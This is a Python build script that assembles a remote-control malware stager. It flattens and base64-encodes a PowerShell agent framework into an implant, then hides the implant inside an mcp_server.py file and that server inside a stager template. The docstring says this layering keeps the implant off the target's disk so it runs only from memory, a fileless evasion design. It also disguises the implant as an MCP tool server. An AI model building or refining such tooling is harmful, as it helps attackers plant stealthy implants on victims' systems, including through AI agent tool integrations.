#!/usr/bin/env python3
"""
Assemble the full-deploy RC stager by embedding base64-encoded payloads
into the stager template.

The implant PS1 is baked into mcp_server.py (replacing __IMPLANT_B64__) so
it is never written to disk on the target — only decoded into memory at
runtime and piped to pwsh as a ScriptBlock.

PshAgent is flattened (all PS1 files concatenated in dependency order),
base64-encoded, and baked into the implant as __PSHAGENT_B64__.  At runtime
the implant decodes the blob and loads it via New-Module -ScriptBlock.

The stager itself carries one blob:
  1. mcp_server.py (with implant+PshAgent embedded)  →  __MCP_SERVER_B64__
"""

import argparse
import base64
from pathlib import Path

# Class load order — must match PshAgent.psm1 lines 7–19
CLASS_ORDER = [
    "Types",
    "Content",
    "ToolCall",
    "Message",
    "Reaction",
    "AgentEvent",
    "StopCondition",
    "Hook",
    "Tool",
    "Generator",
    "Trajectory",
    "Agent",
    "Session",
]


def flatten_pshagent(dir_path: Path) -> str:
    """Read and concatenate all PshAgent PS1 files in dependency order.

    Order:
      1. Classes/ in explicit order (CLASS_ORDER)
      2. Private/*.ps1  (sorted)
      3. Public/*.ps1   (sorted)
      4. Tools/*.ps1    (sorted)
      5. Export-ModuleMember block from PshAgent.psm1 (lines 40–104)
    """
    parts: list[str] = []

    # 1. Classes in explicit dependency order
    classes_dir = dir_path / "Classes"
    for name in CLASS_ORDER:
        ps1 = classes_dir / f"{name}.ps1"
        if not ps1.exists():
            raise FileNotFoundError(f"Missing class file: {ps1}")
        parts.append(ps1.read_text())

    # 2–4. Private, Public, Tools (glob, sorted)
    for subdir in ("Private", "Public", "Tools"):
        folder = dir_path / subdir
        if folder.is_dir():
            for ps1 in sorted(folder.glob("*.ps1")):
                parts.append(ps1.read_text())

    # 5. Export-ModuleMember block from PshAgent.psm1
    psm1 = dir_path / "PshAgent.psm1"
    if psm1.exists():
        lines = psm1.read_text().splitlines(keepends=True)
        # Extract from the $exportedFunctions declaration through the end
        export_lines: list[str] = []
        capturing = False
        for line in lines:
            if not capturing and "$exportedFunctions" in line:
                capturing = True
            if capturing:
                export_lines.append(line)
        if export_lines:
            parts.append("".join(export_lines))

    return "\n".join(parts)


def main() -> None:
    parser = argparse.ArgumentParser(description="Assemble full-deploy RC stager")
    parser.add_argument("--mcp-server", required=True, help="Path to mcp_server.py")
    parser.add_argument(
        "--implant", required=True, help="Path to assembled implant PS1"
    )
    parser.add_argument(
        "--pshagent-dir", required=True, help="Path to PshAgent module directory"
    )
    parser.add_argument("--template", required=True, help="Path to stager template")
    parser.add_argument(
        "--output", required=True, help="Output path for assembled stager"
    )
    parser.add_argument(
        "--implant-id", required=True, help="Unique implant instance ID (UUID)"
    )
    args = parser.parse_args()

    mcp_server = Path(args.mcp_server)
    implant = Path(args.implant)
    pshagent_dir = Path(args.pshagent_dir)
    template = Path(args.template)
    output = Path(args.output)

    implant_id = args.implant_id

    # Step 1: Flatten PshAgent into a single script and base64-encode
    pshagent_text = flatten_pshagent(pshagent_dir)
    pshagent_b64 = base64.b64encode(pshagent_text.encode("utf-8")).decode("ascii")

    # Step 2: Bake PshAgent blob + implant ID into the implant
    implant_text = implant.read_text()
    implant_text = implant_text.replace("__PSHAGENT_B64__", pshagent_b64)
    implant_text = implant_text.replace("__IMPLANT_ID__", implant_id)

    # Step 3: Bake the enriched implant into mcp_server.py
    implant_b64 = base64.b64encode(implant_text.encode("utf-8")).decode("ascii")
    mcp_source = mcp_server.read_text()
    mcp_source = mcp_source.replace("__IMPLANT_B64__", implant_b64)

    # Step 4: Base64-encode the enriched MCP server for the stager
    mcp_b64 = base64.b64encode(mcp_source.encode("utf-8")).decode("ascii")

    # Step 5: Substitute into stager template
    content = template.read_text()
    content = content.replace("__MCP_SERVER_B64__", mcp_b64)
    content = content.replace("__IMPLANT_ID__", implant_id)

    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(content)

    # Summary
    print(f"Implant ID:   {implant_id}")
    print(f"PshAgent:     {len(pshagent_b64):>10,} chars (flattened, base64)")
    print(
        f"Implant:      {len(implant_b64):>10,} chars (with PshAgent, baked into MCP server)"
    )
    print(f"MCP server:   {len(mcp_b64):>10,} chars (base64, with implant+PshAgent)")
    print(f"Total stager: {len(content):>9,} chars")
    print(f"Written to:   {output}")


if __name__ == "__main__":
    main()
